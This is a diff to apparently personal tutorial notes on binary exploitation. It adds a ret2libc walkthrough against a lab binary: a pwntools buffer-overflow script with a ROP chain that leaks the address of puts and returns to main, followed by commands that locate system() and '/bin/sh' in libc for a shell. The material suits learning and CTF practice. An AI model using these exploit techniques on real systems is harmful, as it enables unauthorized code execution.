@@ -343,7 +343,7 @@ We will use pwntools for interacting with the process, but for the purposes of t
 from pwn import *
 
 context.binary = './vulnerable'
-p = process('./vulnerable', stdin=process.PTY)       #MAY NEED TO CHANGE STDIN/OUT args
+p = process('./vulnerable', stdin=PTY)       #MAY NEED TO CHANGE STDIN/OUT args
 context(terminal=['tmux','new-window'])
 #context.log_level = 'DEBUG'    #Prints debugging messages
 #p = gdb.debug('./ret2win32')   #Allows us to interact with GDB running the process. Fpr GDB to catch SEGFAULT need the script to continue afterwards, i.e. add a raw_input()
@@ -376,7 +376,7 @@ objdump -D garbage | grep puts
 from pwn import *
 
 context.binary = './vulnerable'
-p = process('./vulnerable', stdin=process.PTY)       #MAY NEED TO CHANGE STDIN/OUT args
+p = process('./vulnerable', stdin=PTY)
 
 plt_put = 0x401050
 got_put = 0x404028
@@ -388,6 +388,65 @@ print p.recvuntil(":")
 p.sendline(payload)
 print p.recvuntil(".")
 raw_input()          # so our script continues after the process crashes so we can see SEGFAULT
+```
+#### Return program to main so we can overflow again with known glibc address
+
+```
+huwwp@ubuntu:~/binary/garbage$ objdump -D garbage | grep main                      
+0000000000401619 <main>: 
+```
+
+```
+from pwn import *
+
+context.binary = './garbage'
+p = process('./garbage', stdin=PTY)
+context(terminal=['tmux','new-window'])
+context.log_level = 'DEBUG'
+#p = gdb.debug('./garbage', stdin=PTY)
+
+offset = "A" * 136
+
+#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
+#0x000000000040179b : pop rdi ; ret
+#0000000000401619 <main>:
+
+plt_put = p64(0x401050)
+got_put = p64(0x404028)
+pop_rdi = p64(0x40179b)
+plt_main = p64(0x401619)
+
+payload = pop_rdi + got_put + plt_put + plt_main
+
+print p.recv()
+p.sendline(offset + payload)
+print p.recvuntil('.\n')
+leaked_puts = p.recvline().strip()
+print "Leaked puts: " + leaked_puts
+print p.recv()
+raw_input()
+```
+#### Construct a ROP Chain to send us a shell and perform overflow again
+
+First find libc
+```
+$ locate libc.so.6
+/home/huwwp/binary/garbage/libc.so.6
+```
+Find the location of puts in libc so we can calculate the runtine offset between our leaked puts and this one.
+```
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
+425: 0000000000081010   437 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+```
+Find the location of system() in libc
+```
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+1417: 0000000000050300    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+```
+Find the string /bin/sh in libc
+```
+$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh                                        
+ 1aae80 /bin/sh
 ```
 
 ### Disabling OS and Compiler Security
